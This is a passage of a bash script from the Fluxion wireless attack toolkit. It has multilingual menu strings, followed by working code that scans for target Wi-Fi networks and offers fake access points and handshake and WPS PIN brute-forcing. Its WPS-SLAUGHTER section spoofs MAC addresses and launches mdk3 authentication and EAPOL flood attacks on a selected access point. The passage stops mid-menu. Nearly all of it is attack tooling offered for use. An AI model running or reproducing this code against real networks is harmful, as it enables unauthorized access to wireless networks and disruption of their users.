    header_choosescan="Selecteaza canalul"
    choosescan_option_1="Toate canalele "
    choosescan_option_2="Canal specific(s)"
    #
    scanchan_option_1="Un singur canal"
    scanchan_option_2="Canale multiple"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Scaneaza tinta"
    #
    header_askAP="Selecteaza optiunea de atac"
    askAP_option_1="FakeAP - Hostapd ("$red"Recomandat)"
    askAP_option_2="FakeAP - airbase-ng (Conexiune mai lenta)"
    askAP_option_3="WPS-SLAUGHTER - Fortare bruta a pinului WPS"
    askAP_option_4="Bruteforce - (Handshake este necesara)"
    #
    header_askauth="METODA PENTRU VERIFICAREA PAROLEI"
    askauth_option_1="Handshake ("$red"Recomandat)"
    askauth_option_2="Wpa_supplicant(Mai multe eșecuri)"
    #
    header_deauthforce="Verificare Handshake"
    deauthforce_option_1="aircrack-ng (Sansa ratata)"
    #
    header_deauthMENU="*Capturare Handshake*"
    deauthMENU_option_1="Verificare handshake"
    #
    handshakelocation_1="Handshake locatie  (Examplu: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Apasa ${yellow}ENTER$transparent to skip"
    #
    header_webinterface="Selecteaza optiunea ta"
    header_ConnectionRESET="Selecteaza pagina de logare"
    #
    general_back="Inapoi"
    general_error_1="Nu a fost gasit"
    general_case_error="Optiune necunoscuta. Incearca din nou"
    general_exitmode="Curatire si inchidere"
    general_exitmode_1="Dezacticati interfata monitorizata"
    general_exitmode_2="Dezactivati interfata"
    general_exitmode_3="Dezactivati "$grey"forwarding of packets"
    general_exitmode_4="Curatire "$grey"iptables"
    general_exitmode_5="Restaurare "$grey"tput"
    general_exitmode_6="Restartare "$grey"Network-Manager"
    general_exitmode_7="Curatire efectuata cu succes!"
    general_exitmode_8="Multumesc pentru ca ati folosit fluxion"
    #
    selection_1="Clienti activi"
    selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
    setinterface
}

function turkish {
	header_setinterface="Bir Ag Secin"
    setinterface_error="Wireless adaptorunuz yok, program kapatiliyor..."

    #
    header_choosescan="Kanal Sec"
    choosescan_option_1="Tum Kanallar "
    choosescan_option_2="Sectigim Kanal ya da Kanallar"
    #
    scanchan_option_1="Tek Kanal"
    scanchan_option_2="Coklu Kanal"
    #
    header_scan="Wifi Goruntule"
    #
    header_scanchan="Hedef Taraniyor"
    #
    header_askAP="Saldiri Tipi Secin"
    askAP_option_1="SahteAP - Hostapd ("$red"Tavsiye Edilen)"
    askAP_option_2="SahteAP - airbase-ng (Yavas Baglanti)"
    askAP_option_3="WPS-SLAUGHTER(Wps Katliam) - Kabakuvvet ile WPS Pin"
    askAP_option_4="Kabakuvvet - (Handshake Gereklidir)"
    #
    header_askauth="Sifre Kontrol Metodu"
    askauth_option_1="Handshake ("$red"Tavsiye Edilen)"
    askauth_option_2="Wpa_supplicant(Hata Orani Yuksek)"
    #
    header_deauthforce="Handshake Kontrol"
    deauthforce_option_1="aircrack-ng (Hata Sansı Var)"
    #
    header_deauthMENU="*Kaydet Handshake*"
    deauthMENU_option_1="Kontrol Et handshake"
    #
    handshakelocation_1="handshake Dizini  (Ornek: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Tusa Bas ${yellow}ENTER$transparent Gecmek icin"
    #
    header_webinterface="Secenegi Sec"
    header_ConnectionRESET="Giris Sayfasini Sec"
    #
    general_back="Geri"
    general_error_1="Bulunamadi"
    general_case_error="Bilinmeyen Secenek. Tekrar Seciniz"
    general_exitmode="Temizleniyor ve Kapatiliyor"
    general_exitmode_1="Monitor modu kapatiliyor"
    general_exitmode_2="Ag Arayuzu kapatiliyor"
    general_exitmode_3="Kapatiliyor "$grey"forwarding of packets"
    general_exitmode_4="Temizleniyor "$grey"iptables"
    general_exitmode_5="Yenileniyor "$grey"tput"
    general_exitmode_6="Tekrar Baslatiliyor "$grey"Network-Manager"
    general_exitmode_7="Temizlik Basariyla Tamamlandi!"
    general_exitmode_8="Fluxion kullandiginiz icin tesekkurler."
    #
    selection_1="Aktif kullanicilar"
    selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
    setinterface
}

function spain {
	header_setinterface="Seleccione una interfase"
    setinterface_error="No hay tarjetas inalambricas, saliendo..."

    #
    header_choosescan="Seleccione canal"
    choosescan_option_1="Todos los canales "
    choosescan_option_2="Canal(es) específico(s)"
    #
    scanchan_option_1="Canal único"
    scanchan_option_2="Canales múltiples"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Escaneando objetivo"
    #
    header_askAP="Seleccione Opción de Ataque"
    askAP_option_1="FakeAP - Hostapd ("$red"Recomendado)"
    askAP_option_2="FakeAP - airbase-ng (Conexión más lenta)"
    askAP_option_3="WPS-SLAUGHTER - Fuerza Bruta al Pin WPS"
    askAP_option_4="Bruteforce - (Se requiere handshake)"
    #
    header_askauth="MÉTODO PARA VERIFICAR CONTRASEÑA"
    askauth_option_1="Handshake ("$red"Recomendado)"
    askauth_option_2="Wpa_supplicant(Más Fallas)"
    #
    header_deauthforce="Chequeo de Handshake"
    deauthforce_option_1="aircrack-ng (Posibilidad de error)"
    #
    header_deauthMENU="*Capturar Handshake*"
    deauthMENU_option_1="Chequear handshake"
    #
    handshakelocation_1="ubicación del handshake  (Ejemplo: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Presione ${yellow}ENTER$transparent para saltar"
    #
    header_webinterface="Seleccione su opción"
    header_ConnectionRESET="Seleccione página de Login"
    #
    general_back="Atrás"
    general_error_1="No_Encontrado"
    general_case_error="Opción desconocida. Elija de nuevo"
    general_exitmode="Limpiando y cerrando"
    general_exitmode_1="Deshabilitando interfaz de monitoreo"
    general_exitmode_2="Deshabilitando interfaz"
    general_exitmode_3="Deshabilitando "$grey"reenvio de paquetes"
    general_exitmode_4="Limpiando "$grey"iptables"
    general_exitmode_5="Restaurando "$grey"tput"
    general_exitmode_6="Reiniciando "$grey"Network-Manager"
    general_exitmode_7="Limpieza realizada satisfactoriamente!"
    general_exitmode_8="Gracias por usar fluxion"
    #
    selection_1="Clientes activos"
    selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
	setinterface

}

function chinese {

	setinterface_error="没有检测到网卡 退出..."
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="选择信道"
	choosescan_option_1="所有信道 "
	choosescan_option_2="指定信道"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="单一信道"
	scanchan_option_2="多个信道"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="正在扫描目标"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="选择攻击选项"
	askAP_option_1="伪装AP - Hostapd ("$red"推荐)"
	askAP_option_3="WPS-SLAUGHTER - 暴力破解 WPS Pin"
	askAP_option_4="暴力破解 - (需要握手包)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="请选择验证密码方式"
	askauth_option_2="提供的wpa (易错)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="握手包检查"
	deauthforce_option_1="aircrack-ng (Miss chance)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*抓握手包*"
	deauthMENU_option_1="检查握手包"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="请选择"
	header_ConnectionRESET="选择登陆界面"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_back="返回"
	general_error_1="未找到"
	general_case_error="未知选项. 请再次选择"
	general_exitmode="清理并退出"
	general_exitmode_3="关闭 "$grey"forwarding of packets"
	general_exitmode_4="清理 "$grey"iptables"
	general_exitmode_5="恢复 "$grey"tput"
	general_exitmode_6="重启 "$grey"Network-Manager"
	general_exitmode_7="清理完成!"
	general_exitmode_8="感谢使用fluxion!"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="活动的客户端"
	selection_2="选择一个目标. 重扫 按$red r$transparent"
	setinterface
}
# Choose Interface
function setinterface {
  Sites="~/fluxion/stable/Sites"
  airmonfile="~/fluxion/stable/airmon"
  if [ ! -d "$Sites" ]; then
  	cp -r ~/fluxion/Sites ~/fluxion/stable/ &>$flux_output_device
  fi

  if [ ! -f "$airmonfile" ]; then
  	cp -r ~/fluxion/airmon ~/fluxion/stable/ &>$flux_output_device
  fi

  conditional_clear
	top
	#unblock interfaces
	rfkill unblock all

	# Collect all interfaces in montitor mode & stop all
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$flux_output_device
		echo -n "$monkill, "
	done

	# Create a variable with the list of physical network interfaces
	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`./airmon| grep -c "-"`


	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		echo $header_setinterface
		echo
		i=0

		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$blue ""$i)"$transparent" $line"
		done
		echo
		echo -n "#? "
		read line
		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			conditional_clear
			top
			setinterface
		fi

		readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1

		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$flux_output_device
		done
		sleep 0.5

		modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
		sleep 0.5
		# Select Wifi Interface
		select PREWIFI in $INTERFACES; do
			break;
		done

		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
		WIFI=$PREWIFI

		#No wireless cards
	else

		echo $setinterface_error
		sleep 5
		exitmode
	fi

	deltax
}

# Check files
function deltax {

	conditional_clear
	CSVDB=dump-01.csv

	rm -rf $DUMP_PATH/*

	choosescan
	selection
}

# Select channel
function choosescan {

	conditional_clear

	while true; do
		conditional_clear
		top

		echo "$header_choosescan"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $choosescan_option_1          "
		echo -e "      "$blue"2)"$transparent" $choosescan_option_2       "
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) Scan ; break ;;
			2 ) Scanchan ; break ;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}

# Choose your channel if you choose option 2 before
function Scanchan {

	conditional_clear
	top

	  echo "                                       "
	  echo "$header_choosescan     "
	  echo "                                       "
	  echo -e "     $scanchan_option_1 "$blue"6"$transparent"               "
	  echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
	  echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
	  echo "                                       "
	echo -n "      #> "
	read channel_number
	set -- ${channel_number}
	conditional_clear

	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
}

# Scans the entire network
function Scan {

	conditional_clear
	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
}

# Choose a network
function selection {

	conditional_clear
	top


	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		deltax && break
	fi

	fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	fluxionap=`expr $fluxionap - 1`
	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
	echo "                        WIFI LIST "
	echo ""
	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
	echo ""
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`

			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*"
			echo -e " ""$red "$i")"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

			else

			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""

			fi

			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dump-02.csv
	echo
	echo -e ""$green "("$white"*"$green")$selection_1"$transparent""
	echo ""
	echo -e "        $selection_2"
	echo -n "      #> "
	read choice

	if [[ $choice -eq "r" ]]; then
	deltax
	fi

	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}

	conditional_clear

	askAP
}

function wpsselection {

	conditional_clear


	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		deltax && break
	fi

	fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	fluxionap=`expr $fluxionap - 1`
	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
	echo "                        WIFI LIST "
	echo ""
	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
	echo ""
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`

			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*"
			fi

			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dump-02.csv
	echo
	echo -e ""$green "("$white"*"$green ")$selection_1"$transparent""
	echo ""
	echo "        Select Target              "
	echo -n "      #> "
	read choice
	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}

	conditional_clear


}

# FakeAP
function askAP {

	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`

	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
		selection && break
	fi

	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
		fakeapmode="airbase-ng"
		askauth
	fi

	top
	while true; do

		infoap

		echo "          #### $header_askAP ####"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $askAP_option_1"
		echo -e "      "$blue"2)"$transparent" $askAP_option_2"
		echo -e "      "$blue"3)"$transparent" $askAP_option_3"
		echo -e "      "$blue"4)"$transparent" $askAP_option_4"
		echo -e "      "$blue"5)"$red" $general_back" $transparent""
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
			2 ) fakeapmode="airbase-ng"; askauth; break ;;
			3 ) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
			4 ) fakeapmode="Aircrack-ng"; Bruteforce; break;;
			5 ) selection; break ;;
			* ) echo "$general_case_error"; conditional_clear ;;
		esac
	done

}

# Test Passwords / airbase-ng
function askauth {

	conditional_clear

	top
	while true; do

		echo "$header_askauth"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $askauth_option_1"
		echo -e "      "$blue"2)"$transparent" $askauth_option_2"
		echo -e "      "$blue"3)"$transparent" $general_back"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) authmode="handshake"; handshakelocation; break ;;
			2 ) authmode="wpa_supplicant";  webinterface; break ;;
			3 ) askAP; break ;;
			* ) echo "$general_case_error"; conditional_clear ;;
		esac
	done

}

function wps {
clear
declare WIFI_MONITOR1;
declare WIFI_MONITOR2;
declare WIFI_MONITOR3;
declare WIFI_MONITOR4;
declare WIFI_MONITOR5;

echo "
██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗
██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

"

echo "WPS-SLAUGHTER BY: Apathetic Euphoria"
echo "+ Help and Support from Aanarchyy"

sleep 3
clear

rfkill unblock all

#####Functions for Monitor Mode####

enable_mon_mode_1()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR1"
ifconfig $WIFI_MONITOR1 down
sleep 1
iwconfig $WIFI_MONITOR1 mode monitor
sleep 1
ifconfig $WIFI_MONITOR1 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_2()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR2"
ifconfig $WIFI_MONITOR2 down
sleep 1
iwconfig $WIFI_MONITOR2 mode monitor
sleep 1
ifconfig $WIFI_MONITOR2 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_3()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR3"
ifconfig $WIFI_MONITOR3 down
sleep 1
iwconfig $WIFI_MONITOR3 mode monitor
sleep 1
ifconfig $WIFI_MONITOR3 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_4()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR4"
ifconfig $WIFI_MONITOR4 down
sleep 1
iwconfig $WIFI_MONITOR4 mode monitor
sleep 1
ifconfig $WIFI_MONITOR4 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_5()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR5"
ifconfig $WIFI_MONITOR5 down
sleep 1
iwconfig $WIFI_MONITOR5 mode monitor
sleep 1
ifconfig $WIFI_MONITOR5 up
echo "Monitor Mode Enabled"
}

####End of Functions for Monitor Mode####

#### Functions for MAC CHANGER ####

mac_change_1()
{
echo "Setting the MAC Address on $WIFI_MONITOR1"
ifconfig $WIFI_MONITOR1 down
sleep 3
macchanger $WIFI_MONITOR1 -m 02:22:88:29:EC:6F
sleep 3
ifconfig $WIFI_MONITOR1 up
echo "MAC Changed"
}

mac_change_2()
{
echo "Setting the MAC Address on $WIFI_MONITOR2"
ifconfig $WIFI_MONITOR2 down
sleep 3
macchanger $WIFI_MONITOR2 -m 02:22:88:29:EC:6F
sleep 3
ifconfig $WIFI_MONITOR2 up
echo "MAC Changed"
}

mac_change_3()
{
echo "Setting the MAC Address on $WIFI_MONITOR3"
ifconfig $WIFI_MONITOR3 down
sleep 3
macchanger $WIFI_MONITOR3 -m 02:22:88:29:EC:6F
sleep 3
ifconfig $WIFI_MONITOR3 up
echo "MAC Changed"
}

mac_change_4()
{
echo "Setting the MAC Address on $WIFI_MONITOR4"
ifconfig $WIFI_MONITOR4 down
sleep 3
macchanger $WIFI_MONITOR4 -m 02:22:88:29:EC:6F
sleep 3
ifconfig $WIFI_MONITOR4 up
echo "MAC Changed"
}

mac_change_5()
{
echo "Setting the MAC Address on $WIFI_MONITOR5"
ifconfig $WIFI_MONITOR5 down
sleep 3
macchanger $WIFI_MONITOR5 -m 02:22:88:29:EC:6F
sleep 3
ifconfig $WIFI_MONITOR5 up
echo "MAC Changed"
}

####End of Functions for MAC CHANGER ####


####Target Scanner####

scan_for_targets()
{
wpsselection
}

####End of Target Scanner####

################################## Functions For MDK3 ########################################

run_mdk3_ASOC1()
{
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m"
}

run_mdk3_EAPOL1()
{
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250"
}

run_mdk3_ASOC2()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
}

run_mdk3_EAPOL2()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
}

run_mdk3_ASOC3()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
}

run_mdk3_EAPOL3()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
}

run_mdk3_ASOC4()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
}

run_mdk3_EAPOL4()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
}

run_mdk3_ASOC5()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
ifconfig $WIFI_MONITOR5 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR5 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
ifconfig $WIFI_MONITOR5 down
sleep 1
}

run_mdk3_EAPOL5()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
ifconfig $WIFI_MONITOR5 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR5 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
ifconfig $WIFI_MONITOR5 down
sleep 1
}

##################################End Of Functions For MDK3 ########################################

WPS_ATTACK_MENU()
{
top
echo "Which Attack Would You Like To Use?"
		echo "                                       "
		echo -e "      "$blue"0)"$transparent" Select New Target Network"
		echo -e "      "$blue"1)"$transparent" EAPOL Start Flood"
		echo -e "      "$blue"2)"$transparent" Authentication Flood"
		echo -e "      "$blue"3)"$transparent" Reaver "
		echo -e "      "$blue"4)"$transparent" Check if Access Point WPS is UNLOCKED"
		echo -e "      "$blue"5)"$transparent" Reaver with AutoFlood(ASOC)"
		echo -e "      "$blue"6)"$transparent" Reaver with AutoFlood(EAPOL)"
		echo -e "      "$blue"7)"$transparent" Bully "
		echo -e "      "$blue"8)"$transparent" Bully with AutoFlood(ASOC) "
		echo -e "      "$blue"9)"$transparent" Bully with AutoFlood(EAPOL) "
		echo -e "      "$blue"10)"$transparent"Exit"
		echo "                                       "
		echo "*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

}


top
echo "How many Wlan Adapters would You like to use?"
echo "                                       "
echo -e ""$blue"1)"$transparent" 1 Adapter"
echo -e ""$blue"2)"$transparent" 2 Adapters"
echo -e ""$blue"3)"$transparent" 3 Adapters"
